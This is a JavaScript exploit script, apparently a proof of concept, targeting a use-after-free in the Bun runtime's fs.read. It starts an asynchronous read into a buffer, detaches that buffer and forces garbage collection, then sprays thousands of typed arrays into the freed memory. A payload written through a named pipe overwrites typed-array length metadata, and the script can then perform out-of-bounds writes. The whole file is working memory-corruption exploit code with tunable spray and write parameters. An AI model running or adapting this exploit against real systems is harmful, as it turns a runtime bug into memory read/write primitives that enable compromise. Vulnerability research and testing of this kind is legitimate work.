import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const iterations = Number(process.env.ITERATIONS || 64);
const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const writeOffset = Number(process.env.WRITE_OFFSET || 48);
const writeLength = Number(process.env.WRITE_LENGTH || 8);
const newValue = BigInt(process.env.NEW_VALUE || "256");
const expandView = process.env.EXPAND_VIEW === "1";
const expandedWrite = process.env.EXPANDED_WRITE === "1";
const expandedWriteValue = Number(process.env.EXPANDED_WRITE_VALUE || 0x42);
const path = join(tmpdir(), `bun-fs-read-typedarray-metadata-write-${process.pid}`);
const retained = [];

if (writeOffset < 0 || writeLength <= 0 || writeOffset + writeLength > uafSize) {
  throw new Error("WRITE_OFFSET/WRITE_LENGTH must fit inside UAF_SIZE");
}

const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
const fd = fs.openSync(path, fs.constants.O_RDWR);

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makePayload() {
  const payload = Buffer.alloc(writeLength, 0);
  let value = newValue;
  for (let i = 0; i < Math.min(writeLength, 8); i++) {
    payload[i] = Number(value & 0xffn);
    value >>= 8n;
  }
  return payload;
}

function allocateViews() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill(0x61 + (i & 15));
    out.push(view);
  }
  return out;
}

function scanChanges() {
  const changed = [];
  for (let i = 0; i < retained.length; i++) {
    const view = retained[i];
    let first;
    let lastOriginal;
    let firstOOB;
    try {
      first = view[0];
      lastOriginal = view[viewSize - 1];
      firstOOB = view[viewSize];
    } catch (error) {
      firstOOB = `threw:${error?.message || error}`;
    }

    if (view.length !== viewSize || view.byteLength !== viewSize || view.buffer.byteLength !== viewSize || first !== (0x61 + (i & 15))) {
      let expanded;
      if (expandView) {
        const alias = new Uint8Array(view.buffer);
        expanded = {
          length: alias.length,
          byteLength: alias.byteLength,
          readAtOriginalEnd: alias[viewSize],
        };
        if (expandedWrite) {
          alias[viewSize] = expandedWriteValue;
          expanded.afterWriteAtOriginalEnd = alias[viewSize];
        }
      }

      changed.push({
        index: i,
        length: view.length,
        byteLength: view.byteLength,
        bufferByteLength: view.buffer.byteLength,
        byteOffset: view.byteOffset,
        first,
        lastOriginal,
        firstOOB,
        expanded,
      });
      if (changed.length >= 16) break;
    }
  }
  return changed;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(uafSize);
  const source = new Uint8Array(ab);
  source.fill(0x51);

  const done = new Promise(resolve => {
    fs.read(fd, source, writeOffset, writeLength, null, (err, bytesRead) => resolve({ err, bytesRead }));
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateViews());
  gcNow();

  fs.writeSync(fd, makePayload(), 0, writeLength);
  const result = await done;
  const changed = scanChanges();

  console.log(JSON.stringify({
    iteration,
    uafSize,
    viewSize,
    sprayCount,
    writeOffset,
    writeLength,
    newValue: `0x${newValue.toString(16)}`,
    bytesRead: result.bytesRead,
    err: result.err?.message,
    changed,
  }));

  return changed.length > 0;
}

try {
  for (let i = 1; i <= iterations; i++) {
    if (await runOne(i)) {
      process.exitCode = 86;
      break;
    }
  }
} finally {
  fs.closeSync(fd);
  fs.unlinkSync(path);
}
